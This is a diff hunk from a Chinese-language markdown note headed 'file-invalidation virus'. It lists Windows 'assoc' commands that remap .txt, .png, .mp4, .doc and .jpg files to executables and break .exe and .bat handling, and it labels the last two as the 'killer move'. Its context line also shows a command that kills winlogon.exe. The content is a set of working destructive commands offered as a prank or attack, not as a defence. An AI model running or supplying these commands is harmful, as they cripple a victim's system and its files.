@@ -231,8 +231,8 @@ ntsd -c q -pn winlogon.exe
 ## 文件失效病毒
 - `assoc .txt=exefile` 表示：凡是遇到.txt 结尾的都当做 exe 文件处理
 - `assoc .png=exefile` 
-- `assoc .mp4=exefile assoc` 
-- `.doc=exefile` 
+- `assoc .mp4=exefile` 
+- `assoc .doc=exefile` 
 - `assoc .jpg=exefile`
 - `assoc .exe=txtfile` （ 绝 杀 ） 
 - `assoc .bat=pngfile` （ 绝 杀 ）
